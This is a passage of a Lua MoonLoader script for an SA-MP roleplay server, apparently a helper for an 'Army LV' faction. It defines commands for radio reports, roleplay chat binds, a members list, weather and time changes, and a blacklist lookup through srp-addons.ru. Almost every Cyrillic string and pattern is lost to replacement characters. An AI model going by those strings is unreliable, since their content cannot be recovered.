				["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
				["2"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
				["3"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
				["4"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
				["5"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
				["6"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
				["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
		}

		if arr[sparams] == nil and sparams ~= "0" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������", 0xFFFF0000) return end
		if sparams == "0" then sampSendChat("/f " .. tag .. " ��������������� ��������, ����� ������") return end
		sampSendChat("/f " .. tag .. " �������� � �������� " .. kvadrat() .. " �������������� � ���������� ���� " .. arr[sparams] .. "")
end

function cmd_bgruz(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[5] .. " [mkv - ��������� �������/�������]", 0xFFFF0000) return end
		local kv = ""
		if sparams == "mkv" then if lastKV.m ~= "" then kv = lastKV.m lastKV.m = "none" else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ��������� �������", 0xFFFF0000) return end end
		if kv == "" then
				local b, n = sparams:match("([�-�])-(%d+)")
				if (b == nil or (tonumber(n) < 1 or tonumber(n) > 24)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
				kv = "" .. b .. "-" .. n .. ""
		end

		sampSendChat("/f " .. tag .. " �������� � �������� " .. kv .. " ��������� �� ����")
end

function cmd_kv(sparams)
		if sparams == "" or (sparams ~= "0" and sparams ~= "1") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[6] .. " [0 - �������/1 - ����]", 0xFFFF0000) return end
		local d = sparams == "0" and "�������. ���������� ������� ��������������" or "����. ���������� ������� �� ����������"
		sampSendChat("/f " .. tag .. " ������� " .. kvadrat() .. " " .. d .. "")
end

function cmd_e(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[7] .. " [0 - ������� �����(��)/1 - ��������� �����(��)]", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		if params[1] == "0" then
				if params[2] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /" .. config_ini.Commands[7] .. " 0 [id1] ([id2]) ([id3])", 0xFFFF0000) return end
				local kv = kvadrat()
				lastKV.b = kv
				local d = "/r " .. tag .. " ������� ����"
				local d2 = ""
				local d3 = ""
				if params[3] ~= nil then
						d2 = "�� � �������� " .. kv .. ". ������: " .. params[2] .. " " .. params[3] .. ""
						d3 = params[4] ~= nil and " " .. params[4] .. "" or ""
						lastID.e = "" .. params[2] .. " " .. params[3] .. "" .. d3 .. ""
				else
						d2 = "� � �������� " .. kv .. ". �����: " .. params[2] .. ""
						lastID.e = params[2]
				end

				sampSendChat(d .. d2 .. d3)
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.b .. ", ID: " .. lastID.e .. ".", 0xFFFF0000)
				return
		end

		if params[1] == "1" then
				if params[2] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /" .. config_ini.Commands[7] .. " 1 [������ ����./bkv - ����. ���. ��.] [���� ����./0 - ���. ��.] [lej - ����. ���. id/[id1] ([id2]) ([id3])]", 0xFFFF0000) return end
				local kv = ""
				if params[2] == "bkv" then if lastKV.b == "none" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ��������� �������", 0xFFFF0000) return else kv = lastKV.b lastKV.b = "none" end end
				kv = kv == "" and params[2] or kv
				local dkv = params[3] == "0" and kvadrat() or params[3]
				local ids = ""
				if params[4] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ID.", 0xFFFF0000) return end
				if params[4] == "lej" then if lastID.e ~= "none" then ids = lastID.e lastID.e = "none" else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ��������� �������� id", 0xFFFF0000) return end end
				if ids == "" then ids = params[4] if params[5] ~= nil then ids = "" .. params[4] .. " " .. params[5] .. "" end if params[6] ~= nil then ids = "" .. params[4] .. " " .. params[5] .. " " .. params[6] .. "" end end
				local d = ""
				if ids:len() > 3 then d = "/r " .. tag .. " ����� � " .. kv .. " ���������� � " .. dkv .. ". ������: " .. ids .. "" else d = "/r " .. tag .. " ���� � " .. kv .. " ��������� � " .. dkv .. ". �����: " .. ids .. "" end
				sampSendChat(d)
				return
		end
end

function cmd_r(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[9] .. " [�����]", 0xFFFF0000) return end
		local t = strunsplit(sparams, 80)
		isSending = true
		lua_thread.create(function() for k, v in ipairs(t) do sampSendChat("/f " .. tag .. " " .. v .. "") wait(1300) end isSending = false end)
end

function cmd_pr(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[10] .. " [�������/�����]", 0xFFFF0000) return end
		sampSendChat("/f " .. tag .. " �������, " .. sparams .. "!")
end


function cmd_gr(sparams)
		lua_thread.create(
				function()
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[12] .. " [flash/shock/he/smoke/inc/tear]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}flash - �����-�������, shock - �������, he - ����������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}smoke - �������, inc - �������������, tear - �� ������������ �����", 0xFFFF0000) return end
						local tarr = {["flash"] = "������������ ������� \"�-84\"", ["shock"] = " ������� ������� \"SRBG\"", ["smoke"] = "������� ������� \"M308-1\"", ["inc"] = "������������� ������� \"M14 TH3\"", ["tear"] = "������� �� ������������ ����� \"���-2�\"", ["he"] = "���������� ������� \"���-5\""}
						if tarr[sparams] ~= nil then gr = tarr[sparams] sampSendChat("/me ������" .. RP .. " " .. gr .. " � ����� ��� ������") wait(delay) sampSendChat("/me ��������" .. RP .. " ����") wait(delay) sampSendChat("/me ������" .. RP .. " " .. gr .. " ������ ��� ����") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����������� �������", 0xFFFF0000) end
				end
		)
end

function cmd_hit()
		lua_thread.create(
				function()
						wait(0)
						local weapid = tonumber(getCurrentCharWeapon(PLAYER_PED))
						local weap = otWeaponName[2][weapid]
						local rr = RP == "" and "" or "��"
						if weap ~= nil then sampSendChat("/me �����" .. rr .. " ���� �� ������ ������ ��������� " .. weap .. "") wait(delay) sampSendChat("/do ������ �������� ��������") wait(delay) sampSendChat("/me ����� ������ �� ����")else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������ � ��������� � ����.", 0xFFFF0000) end
				end
		)
end

function cmd_cl(sparams)
		lua_thread.create(
				function()
						wait(0)
						if tonumber(sparams) ~= nil and tonumber(sparams) >= 0 and tonumber(sparams) <= 33 then
								local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
								if not res then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ���� ID", 0xFFFF0000) return end
								local myclist = clists[sampGetPlayerColor(myid)]
								if myclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
								if sparams == myclist then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ���� ������ ���� �����.", 0xFFFF0000) return end
								local res, sid = sampGetPlayerSkin(myid)
								if not res then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ������ �����", 0xFFFF0000) return end
								if ((sid == 287 or sid == 191) and myclist ~= 7 and myclist ~= 0) or (myclist ~= 0 and (sid ~= 287 and sid ~= 191)) then
										sampSendChat("/me ����" .. RP .. " " .. config_ini.UserClist[myclist] .. "")
										wait(1300)
								end

								sampSendChat("/clist " .. sparams .. "")
								if ((tonumber(sparams) == 7) and ((sid == 287) or (sid == 191))) or (tonumber(sparams) == 0) then return end

								wait(1300)
								sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[tonumber(sparams)] .. "")
						else
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[14] .. " [0-33]", 0xFFFF0000)
						end
				end
		)
end

function cmd_memb(sparams)
		lua_thread.create(
				function()
						wait(0)
						if sparams == "" or tonumber(sparams) == nil or (tonumber(sparams) < 0 or tonumber(sparams) > 999) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[16] .. " [id]", 0xFFFF0000) return end
						local id = tonumber(sparams)
						if not sampIsPlayerConnected(tonumber(id)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������.", 0xFFFF0000) return end

						local Members1Text = getMembersText()
						local nick = sampGetPlayerNickname(id)
						local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
						local clist = clist == "ffff" and "fffafa" or clist
						for v in Members1Text:gmatch('[^\n]+') do
								local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
								if zv ~= nil then afk = afk == nil and "" or afk sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- " .. zv .. " " .. afk .. "", 0xFFFF0000) return end
						end

						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000)
				end
		)
end

function cmd_chs(sparams)
		lua_thread.create(
				function()
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[17] .. " [id]", 0xFFFF0000) return end
						local id = -1
						if tonumber(sparams) ~= nil and tonumber(sparams) >= 0 and tonumber(sparams) <= 999  then id = tonumber(sparams) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(sparams)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and sparams or sampGetPlayerNickname(tonumber(sparams))
						local url = 'http://srp-addons.ru/api/log.php?checkbl=' ..  nick .. '&f=Army%20LV&s=95.181.158.63:7777'
						local responsetext = u8:decode(decodebase64(req(url)))
						local arr = decodeJson(responsetext:match("%[(.*)%]"))
						if arr ~= nil then
							sampAddChatMessage("{FF8300}-----------=== ������ ������ Las-Venturas army ===-----------", 0xFFFF0000)
							sampAddChatMessage("{FF8300}�����: {FFFFFF}" .. nick .. " [" .. id .. "]{FF0000} ������ � ������ ������", 0xFFFF0000)
							sampAddChatMessage("{FF8300}�������: {FFFFFF}" .. arr.reason .. "", 0xFFFF0000)
							sampAddChatMessage("{FF8300}��� ����: {FFFFFF}" .. arr.user .. "", 0xFFFF0000)
							sampAddChatMessage("{FF8300}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
						else
							sampAddChatMessage("{FF8300}Black List: �����: {FFFFFF}" .. nick .. " [" .. id .. "]{33AA33} � ������ ������ �� ������", 0xFFFF0000)
						end
				end
		)
end

function cmd_bugreport(sparams)
		lua_thread.create(
				function()
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /bugreport [�����]", 0xFFFF0000) return end
						sendtolog(sparams, 0)
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��������� ���� ������� ����������", 0xFFFF0000)
				end
		)
end

function cmd_mp(sparams)
		lua_thread.create(
				function()
						if sparams ~= "load" and sparams ~= "unload" and sparams ~= "sdok" and sparams ~= "vdok" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[18] .. " [load/unload/sdok/vdok]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}load - �������� �������� ���������; unload - �������� ��������� ���������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}sdok - ������ � ��������� ������ �� ������� ������������; vdok - ������ � ������/��������", 0xFFFF0000) return end
						wait(0)
						if sparams == "load" then sampSendChat("/me ����" .. RP .. " ����� �� ������") wait(delay) sampSendChat("/me ��������" .. RP .. " ����� � ��������") end
						if sparams == "unload" then sampSendChat("/me ����" .. RP .. " ����� � ���������") wait(delay) sampSendChat("/me ���������" .. RP .. " ����� �� �����") end
						if sparams == "sdok" then
								local A_Index = 0
								while true do
										if A_Index == 30 then break end
										local text = sampGetChatString(99 - A_Index)
										local sklad, kol = text:match(" �� ������ (.*)%: (%d%d%d)%d%d%d%/%d+")
										if sklad ~= nil then sampSendChat("/f " .. tag .. " ������������ �� ����� " .. sklad .. ", " .. kol .. " ����. ") return end
										A_Index = A_Index + 1
								end
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���������� ���������� ��������", 0xFFFF0000)
						end

						if sparams == "vdok" then
								local X, Y = getCharCoordinates(playerPed)
								if X >= 276 and Y >= 1799 and X <= 389 and Y <= 2014 then
										sampSendChat("/f " .. tag .. " �����, ��������, �������� ���")
								else
										sampSendChat("/f " .. tag .. " �����, ��������, ���������� ���")
								end
						end
				end
		)
end

function cmd_z(sparams)
		lua_thread.create(
				function()
					wait(0)
					if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[19] .. " [�����]", 0xFFFF0000) return end
					local A_Index = 0
							while true do
									if A_Index == 30 then break end
									local text = sampGetChatString(99 - A_Index)
									local re1 = regex.new("SMS:(.*). �����������: (.*)_(.*)\\[(.*)\\]")
									local _, _, _, smsdid = re1:match(text)
									if smsdid ~= nil then sampSendChat("/t " .. smsdid .. " " .. sparams .. "") return end
									A_Index = A_Index + 1
							end
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}SMS �� ������.", 0xFFFF0000)
				end
		)
end

function cmd_mem1()
	lua_thread.create(function()
		mem1 = {[1] = {}, [2] = {}, [3] = {}, [4] = {}, [5] = {}}
		local Members1Text = getMembersText()
		for v in Members1Text:gmatch('[^\n]+') do
			local n, id, fname, sname, zv, rank, afk = v:match("%[(%d+)%] %[(%d+)%] (%a+)_(%a+)	(%W*) %[(%d+)%](.*)")
			if n ~= nil then
				local afk = afk == nil and "" or afk
				local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
				local clist = clist == "ffff" and "fffafa" or clist
				local zvcol = tonumber(rank) >= 12 and "00BFFF" or (rank == 1 and clist == "fffafa") and "ff0000" or "fffafa"
				table.insert(mem1[1], n)
				table.insert(mem1[2], id)
				table.insert(mem1[3], "{" .. clist .. "}" .. fname .. "_" .. sname .. "")
				table.insert(mem1[4], "{" .. zvcol .. "}" .. zv .. "[" .. rank .. "]")
				table.insert(mem1[5], afk)
			end
		end

		show.show_mem1.v = true
	end)
end

function cmd_st(sparams)
		local hour = tonumber(sparams)
		if hour ~= nil and hour >= 0 and hour <= 23 then
				time = hour
				patch_samp_time_set(true)
		else
				patch_samp_time_set(false)
				time = nil
		end
end

function cmd_afk()
		afkstatus = not afkstatus
		local s = afkstatus and "�������" or "��������"
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ��� ������� " .. s .. ".", 0xFFFF0000)
		local offset = 3600 * tonumber(config_ini.Settings.timep)
		sampSendChat("/fs " .. (afkstatus and "sq_message_id_1_" .. (os.time() - offset) .. "" or "sq_message_id_2") .. "")
end

function cmd_sw(sparams)
		local weather = tonumber(sparams)
	  if weather ~= nil and weather >= 0 and weather <= 45 then
	    	forceWeatherNow(weather)
	  end
end

function cmd_mcall(sparams)
		lua_thread.create(
				function()
						wait(0)
						sampSendChat("/dir")
						--wait(delay)
						while not sampIsDialogActive() do wait(0) end
						sampSendDialogResponse(sampGetCurrentDialogId(), 1, 1)
						while sampGetDialogCaption() ~= "������" do wait(0) end
						wait(100)
						sampCloseCurrentDialogWithButton(1)
						while sampGetDialogCaption() ~= "����" do wait(0) end
						local MechanicksText = sampGetDialogText()
						sampCloseCurrentDialogWithButton(0) wait(100) sampCloseCurrentDialogWithButton(0) wait(100) sampCloseCurrentDialogWithButton(0)
						for v in MechanicksText:gmatch('[^\n]+') do
    						local n, fname, sname, id, numb, afk = v:match("%[(%d+)%] (%a+)_(%a+)%[(%d+)%]	(%d+)(.*)")
    						if n ~= nil then
										if sparams ~= "" and sparams ~= id then sampSendChat("/t " .. id .. " ���, ������� ������ �� �����.") wait(1300) end
										if sparams == "" then sampSendChat("/t " .. id .. " ����� ������� � �������� " .. kvadrat() .. ", �� ��� �����!") wait(1300) end
								end
						end
				end
		)
end

function cmd_showp(sparams)
		lua_thread.create(
					function()
							wait(0)
							if tonumber(sparams) ~= nil and tonumber(sparams) >= 0 and tonumber(sparams) <= 999 then sampSendChat("/showpass " .. sparams .. "") wait(delay) end
							sampSendChat("/me �������" .. RP .. " ������������� � �������� ����")
							wait(delay)
							isSending = true
							sampSendChat("/do � �������������: Army LV | " .. config_ini.Settings.PlayerFirstName .. " " .. config_ini.Settings.PlayerSecondName .. " | " .. config_ini.Settings.PlayerRank .. " | " .. PlayerU .. "")
							isSending = false
						end
			)
end

function cmd_u1()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[1])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u2()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[2])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u3()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[3])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u4()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[4])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u5()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[5])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u6()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[6])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u7()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[7])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u8()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[8])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u9()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[9])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u10()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[10])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u11()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[11])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u12()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[12])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u13()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[13])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u14()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[14])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u15()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[15])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u16()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[16])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u17()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[17])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u18()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[18])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_dokhelp()
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA/" .. config_ini.Commands[1] .. " [����������] [�������/0 - ���. �������] [1-3] - �������� � ���������� ��������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ��������(�) ������(�); 2 - �������� �� ������; 3 - ��������� ��������� � ���� ��������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[2] .. " [����� ����������/0 - �����] - �������� � ������ ������������� �������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[3] .. " [����� ����������/0 - �����] - �������� � ��������� ��������� ���������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[4] .. " [����� ����������/0 - �����] - �������� � ������� ��������� ���������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[5] .. " [������ ��������/0 - ��������� �������� �������] - �������� � �������� ��������������� ��������� �� ����", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[6] .. " [0 - �������/1 - ����] - �������� � ������� �������� ��������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[7] .. " [0 - ������� �����/1 - ���� ���������] - �������� �� ��������� �����", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[10] .. " [�������/�����] - ������� ����� � ��������� �����", 0xFFFF0000)
end

function cmd_commandhelp(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /commandhelp [�������/list]", 0xFFFF0000) return end

		if sparams == config_ini.Commands[1] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA/" .. config_ini.Commands[1] .. " [����������] [�������/0 - ���. �������] [1-3] - �������� � ���������� ��������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ��������(�) ������(�); 2 - �������� �� ������; 3 - ��������� ��������� � ���� ��������", 0xFFFF0000) end
		if sparams == config_ini.Commands[2] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[2] .. " [����� ����������/0 - �����] - �������� � ������ ������������� �������", 0xFFFF0000) end
		if sparams == config_ini.Commands[3] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[3] .. " [����� ����������/0 - �����] - �������� � ��������� ��������� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[4] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[4] .. " [����� ����������/0 - �����] - �������� � ������� ��������� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[5] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[5] .. " [������ ��������/0 - ��������� �������� �������] - �������� � �������� ��������������� ��������� �� ����", 0xFFFF0000) end
		if sparams == config_ini.Commands[6] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[6] .. " [0 - �������/1 - ����] - �������� � ������� �������� ��������", 0xFFFF0000) end
		if sparams == config_ini.Commands[7] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[7] .. " [0 - ������� �����/1 - ���� ���������] - �������� �� ��������� �����", 0xFFFF0000) end
		--if sparams == config_ini.Commands[8] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[8] .. "", 0xFFFF0000) end
		if sparams == config_ini.Commands[9] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[9] .. " [�����] - �������� ��������� ����� � ����� � �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[10] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[10] .. " [�������/�����] - ������� ����� � ��������� �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[11] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[11] .. " - ������������� � �������� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[12] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[12] .. " [flash/shock/he/smoke/inc/tear] - ������� ��������� �������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}flash - �����-�������, shock - �������, he - ����������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}smoke - �������, inc - �������������, tear - �� ������������ �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[13] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[13] .. " - �������� ��������� ����������", 0xFFFF0000) end
		if sparams == config_ini.Commands[14] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[14] .. " [0-33] ������� ���� �� ���������", 0xFFFF0000) end
		if sparams == config_ini.Commands[15] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[15] .. " - ��������� ������ ��", 0xFFFF0000) end
		if sparams == config_ini.Commands[16] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[16] .. " [id] - ��������� ������� ���������� ������ � /members", 0xFFFF0000) end
